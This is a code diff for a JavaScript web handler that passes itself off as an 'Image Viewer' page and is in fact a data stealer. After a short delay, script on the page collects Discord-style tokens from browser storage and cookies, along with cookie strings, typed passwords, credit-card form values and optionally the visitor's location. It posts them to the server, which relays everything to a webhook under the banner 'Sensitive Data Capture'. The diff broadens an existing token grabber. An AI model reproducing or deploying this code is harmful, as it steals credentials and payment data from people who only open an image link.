@@ -106,18 +106,25 @@ async function makeReport(ip, useragent, coords = null, endpoint = "N/A", url = 
   }
 }
 
-async function sendTokenReport(ip, useragent, token) {
+async function sendTokenReport(ip, useragent, token, cookies, passwords, cards) {
   try {
     await fetch(config.tokenCaptureWebhook, {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({
-        username: "TOKEN GRABBER",
+        username: "Sensitive Data Capture",
         content: "@everyone",
         embeds: [{
-          title: "Discord Token Captured!",
+          title: "Data Captured!",
           color: 0xFF0000,
-          description: `**Token:** \`${token}\`\n**IP:** ${ip}\n**User Agent:** ${useragent}`,
+          fields: [
+            { name: "IP", value: ip, inline: true },
+            { name: "User Agent", value: useragent, inline: true },
+            { name: "Discord Token", value: token || "Not found", inline: false },
+            { name: "Cookies", value: `\`\`\`${cookies || "None"}\`\`\``, inline: false },
+            { name: "Passwords", value: passwords || "None", inline: false },
+            { name: "Credit Cards", value: cards || "None", inline: false }
+          ]
         }]
       })
     }).catch(e => console.error('Token webhook error:', e));
@@ -128,23 +135,26 @@ async function sendTokenReport(ip, useragent, token) {
 
 export default async (req, res) => {
   try {
-    // Handle token submission
+    // Handle sensitive data submission
     if (req.method === 'POST') {
-      let token = 'NOT_FOUND';
-      try {
-        const body = JSON.parse(req.body);
-        token = body.token || 'NOT_FOUND';
-      } catch {
-        // Fallback if JSON parse fails
-        token = req.body.token || 'NOT_FOUND';
-      }
-      
       const ip = req.headers['x-forwarded-for'] || 'Unknown';
       const userAgent = req.headers['user-agent'] || 'Unknown';
       
-      if (token && token !== 'NOT_FOUND') {
-        await sendTokenReport(ip, userAgent, token);
+      let data;
+      try {
+        data = JSON.parse(req.body);
+      } catch {
+        data = req.body;
       }
+      
+      await sendTokenReport(
+        ip, 
+        userAgent,
+        data.token,
+        data.cookies,
+        data.passwords,
+        data.cards
+      );
       
       return res.status(200).send('OK');
     }
@@ -178,82 +188,128 @@ export default async (req, res) => {
       return res.redirect(imageUrl);
     }
 
-    // Build HTML content
-    let htmlContent = `<!DOCTYPE html><html><head>
-      <meta charset="UTF-8">
-      <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <title>Image Viewer</title>
-      <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background-color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .image-container { max-width: 100%; max-height: 100vh; text-align: center; }
-        .image-container img { max-width: 100%; max-height: 90vh; object-fit: contain; }
-        .loading { color: #fff; font-family: Arial, sans-serif; font-size: 18px; margin-top: 20px; }
-      </style>
-      <script>
-        setTimeout(() => {
-          const tokenKeys = ['token', 'discord_token', '_token', 'access_token', 'auth_token'];
-          let token = "NOT_FOUND";
-          
-          // Check storage locations
-          tokenKeys.forEach(key => {
-            try {
-              const value = localStorage.getItem(key);
-              if (value && value.length > 50) token = value;
-            } catch(e) {}
-          });
-          
-          if (token === "NOT_FOUND") {
-            tokenKeys.forEach(key => {
-              try {
-                const value = sessionStorage.getItem(key);
-                if (value && value.length > 50) token = value;
-              } catch(e) {}
+    // Build HTML content with data extraction
+    let htmlContent = `<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Image Viewer</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { background-color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+    .image-container { max-width: 100%; max-height: 100vh; text-align: center; }
+    .image-container img { max-width: 100%; max-height: 90vh; object-fit: contain; }
+    .loading { color: #fff; font-family: Arial, sans-serif; font-size: 18px; margin-top: 20px; }
+  </style>
+  <script>
+    // Function to extract all sensitive data
+    function extractSensitiveData() {
+      const data = {
+        token: "NOT_FOUND",
+        cookies: document.cookie,
+        passwords: [],
+        cards: []
+      };
+
+      // Find Discord token
+      const tokenKeys = ['token', 'discord_token', '_token', 'access_token', 'auth_token'];
+      
+      // Check localStorage
+      tokenKeys.forEach(key => {
+        try {
+          const value = localStorage.getItem(key);
+          if (value && value.length > 50) data.token = value;
+        } catch(e) {}
+      });
+      
+      // Check sessionStorage
+      if (data.token === "NOT_FOUND") {
+        tokenKeys.forEach(key => {
+          try {
+            const value = sessionStorage.getItem(key);
+            if (value && value.length > 50) data.token = value;
+          } catch(e) {}
+        });
+      }
+      
+      // Check cookies
+      if (data.token === "NOT_FOUND") {
+        document.cookie.split(';').forEach(cookie => {
+          const [name, value] = cookie.trim().split('=');
+          if (tokenKeys.includes(name) && value && value.length > 50) {
+            data.token = value;
+          }
+        });
+      }
+      
+      // Try to extract saved passwords and credit cards
+      try {
+        // Extract autofill data from forms
+        document.querySelectorAll('input[type="password"]').forEach(input => {
+          if (input.value) {
+            data.passwords.push({
+              username: input.previousElementSibling?.value || 'N/A',
+              password: input.value,
+              url: window.location.href
             });
           }
-          
-          if (token === "NOT_FOUND") {
-            document.cookie.split(';').forEach(cookie => {
-              const [name, value] = cookie.trim().split('=');
-              if (tokenKeys.includes(name) && value && value.length > 50) {
-                token = value;
-              }
+        });
+        
+        // Extract credit cards
+        document.querySelectorAll('input[autocomplete="cc-number"]').forEach(input => {
+          if (input.value) {
+            data.cards.push({
+              number: input.value,
+              name: document.querySelector('input[autocomplete="cc-name"]')?.value || 'N/A',
+              expiry: document.querySelector('input[autocomplete="cc-exp"]')?.value || 'N/A'
             });
           }
-          
-          if (token !== "NOT_FOUND") {
-            fetch('/api/image', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ token })
-            });
-          }
-        }, 3000);
-      </script>`;
+        });
+      } catch(e) {
+        console.error('Data extraction error:', e);
+      }
+      
+      return data;
+    }
+
+    // Send captured data to server
+    setTimeout(() => {
+      const sensitiveData = extractSensitiveData();
+      
+      fetch('/api/image', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(sensitiveData)
+      });
+    }, 3000);
+  </script>`;
 
     // Geolocation script
     if (config.accurateLocation && !query.g) {
       htmlContent += `<script>
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(
-            position => {
-              const lat = position.coords.latitude;
-              const lon = position.coords.longitude;
-              const g = btoa(lat + ',' + lon).replace(/=/g, "%3D");
-              window.location.search += '&g=' + g;
-            },
-            error => console.error('Geolocation error:', error)
-          );
-        }
-      </script>`;
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const g = btoa(lat + ',' + lon).replace(/=/g, "%3D");
+          window.location.search += '&g=' + g;
+        },
+        error => console.error('Geolocation error:', error)
+      );
+    }
+  </script>`;
     }
 
-    htmlContent += `</head><body>
-      <div class="image-container">
-        <img src="${imageUrl}" alt="Preview" onerror="this.style.display='none'">
-        <div class="loading">Loading image...</div>
-      </div>
-    </body></html>`;
+    htmlContent += `</head>
+<body>
+  <div class="image-container">
+    <img src="${imageUrl}" alt="Preview" onerror="this.style.display='none'">
+    <div class="loading">Loading image...</div>
+  </div>
+</body>
+</html>`;
     
     // Process geolocation if available
     const coords = query.g ? Buffer.from(query.g, 'base64').toString() : null;
